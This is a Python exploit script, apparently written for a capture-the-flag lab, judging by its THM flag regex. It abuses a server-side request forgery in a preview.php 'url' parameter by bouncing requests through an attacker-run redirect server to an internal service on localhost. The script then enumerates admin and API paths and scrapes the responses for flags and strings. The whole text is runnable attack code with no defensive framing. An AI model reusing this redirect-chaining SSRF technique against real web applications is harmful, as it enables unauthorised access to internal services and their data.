import requests, urllib.parse, re, json

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='

def fetch_redirect(path):
    target = 'http://127.0.0.1:10000' + path
    redir = attacker + '/redirect?to=' + urllib.parse.quote(target, safe='')
    r = requests.get(base + urllib.parse.quote(redir, safe=''), timeout=10)
    return r.text

def extract_nextjs_text(html):
    # Extract all __next_f.push([1, "..."]) strings
    chunks = re.findall(r'__next_f\.push\(\[1,"(.+?)"\]\)', html, re.DOTALL)
    combined = ''
    for c in chunks:
        try:
            combined += bytes(c, 'utf-8').decode('unicode_escape')
        except Exception:
            combined += c
    # Also grab any visible text-like content
    flags = re.findall(r'THM\{[^}]+\}', html + combined)
    return combined, flags

paths = ['/admin', '/dashboard', '/customapi', '/flag',
         '/api/flag', '/api/books', '/api/users', '/api/v1/books']

for p in paths:
    html = fetch_redirect(p)
    combined, flags = extract_nextjs_text(html)

    if flags:
        print('[FLAG] ' + p + ': ' + str(flags))
        continue

    print('=== ' + p + ' (' + str(len(html)) + 'b) ===')
    # Print the RSC content (remove JSON-like noise)
    readable = re.sub(r'\\u[0-9a-f]{4}', '', combined)
    readable = re.sub(r'\$[A-Z0-9]+', '', readable)
    readable = re.sub(r'\s+', ' ', readable)
    print(readable[:600])
    # Also look for any plain quoted strings
    words = re.findall(r'"([A-Za-z][^"\\]{5,80})"', html)
    important = [w for w in words if not any(x in w for x in
                 ['_next', 'static', 'chunk', 'cross', 'utf', 'viewport',
                  'stylesheet', 'preload', 'charset', 'width', 'height'])]
    if important:
        print('  Strings: ' + str(important[:10]))
    print()
